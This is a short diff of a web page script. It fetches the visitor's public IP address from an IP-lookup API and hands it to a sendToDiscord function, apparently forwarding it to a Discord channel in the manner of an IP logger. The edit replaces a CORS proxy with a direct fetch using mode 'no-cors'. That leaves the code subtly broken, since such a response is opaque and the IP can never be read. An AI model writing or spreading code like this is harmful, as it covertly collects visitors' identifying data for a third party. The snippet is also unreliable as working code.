@@ -8,9 +8,9 @@
         // Function to fetch the IP address
         async function fetchIP() {
             try {
-                const corsProxyURL = "https://cors-anywhere.herokuapp.com/"; // Use a CORS proxy
                 const targetURL = "https://api.my-ip.io/ip";
-                const response = await fetch(corsProxyURL + targetURL);
+                const response = await fetch(targetURL, { mode: 'no-cors' });
+
                 if (response.ok) {
                     const ip = await response.text();
                     sendToDiscord(ip);
